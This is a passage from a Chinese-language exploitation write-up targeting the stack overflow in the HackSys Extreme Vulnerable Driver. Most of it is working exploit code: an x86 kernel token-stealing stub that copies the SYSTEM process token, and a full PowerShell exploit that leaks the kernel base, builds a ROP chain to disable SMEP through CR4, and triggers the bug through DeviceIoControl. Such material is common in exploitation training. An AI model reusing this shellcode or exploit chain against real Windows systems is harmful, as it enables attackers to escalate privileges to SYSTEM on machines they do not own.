            pushad; Save registers state
            ; Start of Token Stealing Stub
            xor eax, eax; Set ZERO
            mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
            ; _KTHREAD is located at FS : [0x124]
            mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process
            mov ecx, eax; Copy current process _EPROCESS structure
            mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4
            SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID
            mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
            mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
            ; with SYSTEM process nt!_EPROCESS.Token
            ; End of Token Stealing Stub
            popad; Restore registers state
            ; Kernel Recovery Stub
            xor eax, eax; Set NTSTATUS SUCCEESS
            add esp, 0x1c; Fix the stack
            pop ebp; Restore saved EBP
            ret 8; Return cleanly
        }
    }
    // Just Communicate with Driver
    VOID TriggerStackOverFlow(DWORD dwCTLCode) {
        HANDLE hDev = GetDeviceHandle();
        if (!hDev)
            return;
        std::cout `指向的是之后会修改成的内容。由于加入了ROP，导致原先利用的返回值会被覆盖掉，所以这里需要重新调整返回值，让esp在调用exp的地址后，加上
**0x1c** ，让其跳转到`nt!IofCallDriver`的返回值，从而恢复调用栈。
####  Powershell版本
本质上差不多，不过这边使用的是Powershell下的编程:
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    public static class EVD2
    {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr VirtualAlloc(
            IntPtr ptrAddress,
            uint dwSize,
            UInt32 AllocationType,
            UInt32 Protext
        );
        [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public static extern IntPtr CreateFile(
            String lpFileName,
            UInt32 dwDesireAccess,
            UInt32 dwSharingMode,
            IntPtr lpSecurityAttributes,
            UInt32 dwCreationDisposition,
            UInt32 dwFlagsAndAttributes,
            IntPtr hTemplateFile
        );
        [DllImport("Kernel32.dll", SetLastError = true)]
        public static extern bool DeviceIoControl(
            IntPtr hDevice,
            int IoControlCode,
            byte[] InBuffer,
            int nInBufferSize,
            byte[] OutBuffer,
            int nOutBufferSize,
            ref int pBytesReturned,
            IntPtr Overlapped); 
        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();
        [DllImport("psapi")]
        public static extern bool EnumDeviceDrivers(
            [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] UInt32[] ddAddresses,
            UInt32 arraySizeBytes,
            [MarshalAs(UnmanagedType.U4)] out UInt32 bytesNeeded
        );
    }
    "@
    Function LeakBaseAddress(){
        $dwByte = 0
        $status=[bool] [EVD2]::EnumDeviceDrivers(0, 0, [ref]$dwByte)
        if(!$status){
            echo $("[*] Unable to enum device.... with error 0x{0:x}`n" -f [EVD2]::GetLastError())
        }
        $ptrAddress = [Uint32[]](9)*0x1000
        $status=[bool] [EVD2]::EnumDeviceDrivers([UInt32[]]$ptrAddress, $dwByte+10, [ref]$dwByte)
        # echo $("Address is {0:x}" -f $ptrAddress[0])
        return $ptrAddress[0]
    }
    $hDevice = [EVD2]::CreateFile("\\.\HackSysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite,[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
    if($hDevice -eq -1){
        echo "`n[*] Unbale to open this driver...`n"
        Return
    }
    echo "`[+] The Device object is $($hDevice) "
    # then we need create an array with buffer
    [Int32]$dwSize = 0x820
    # +0x4+0x8+0x4+0x4
    # alloc buffer for shellcode
    $Shellcode = [Byte[]] @(
        #---[Setup]
        0x53,                                       # push    ebx
        0x56,                                       # push    esi
        0x57,                                       # push    edi
        0x60,                                       # pushad
        0x33, 0xC0,                                 # xor eax, eax
        0x64, 0x8B, 0x80, 0x24, 0x01, 0x00, 0x00,   # mov eax, fs:[KTHREAD_OFFSET]
        0x8B, 0x80, 0x80, 0x00, 0x00, 0x00,         # mov eax, [eax + EPROCESS_OFFSET]
        0x8B, 0xC8,                                 # mov ecx, eax (Current _EPROCESS structure)
        # 0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
        0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] |
        0x8B, 0x90, 0xFC, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
        0x89, 0x91, 0xFC, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        0x61,                               # popad
        0x33, 0xC0,                         # NTSTATUS -> STATUS_SUCCESS :p
        0x83, 0xc4, 0x1c,                   # add esp, 1ch
        0x5D,                               # pop ebp
        0xC2, 0x08, 0x00                    # ret 8
    )
    [IntPtr]$Pointer = [EVD2]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
    $EIP = [System.BitConverter]::GetBytes($Pointer.ToInt32())
    echo "[+] Payload size: $($Shellcode.Length)"
    echo "[+] Payload address: $("{0:X8}" -f $Pointer.ToInt32())"
    $leakAddress = LeakBaseAddress
    echo $("Address is {0:x}" -f $leakAddress)
    $dwSegBaseAddr = 0x401000
    $dwSegOffset = 0x1000
    $dwBasePOPEAX = 0x0048BF1D
    $dwBaseMOVCR4 = 0x0057DF86
    $dwRealMOVCR4 = $dwBaseMOVCR4 - $dwSegBaseAddr + $leakAddress + $dwSegOffset
    $dwRealPOPEAX = $dwBasePOPEAX - $dwSegBaseAddr + $leakAddress + $dwSegOffset
    $dwCR4 = 0x406e9
    echo "[+] pop eax is $($dwRealPOPEAX) `n[+] mov cr4 is $($dwRealMOVCR4)`n"
    # finally we write buffer
    $Buffer = [Byte[]](0x41)*$dwSize + [System.BitConverter]::GetBytes($dwRealPOPEAX) + [Byte[]](0x41)*8 + [System.BitConverter]::GetBytes($dwCR4) + [System.BitConverter]::GetBytes($dwRealMOVCR4) + $EIP
    [EVD2]::DeviceIoControl($hDevice, 0x222003, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero)|Out-null
###  攻击结果
不知道为啥，提权有时候会失败，不过失败了似乎也没有进入蓝屏的样子…
使用powershell进行攻击的结果如下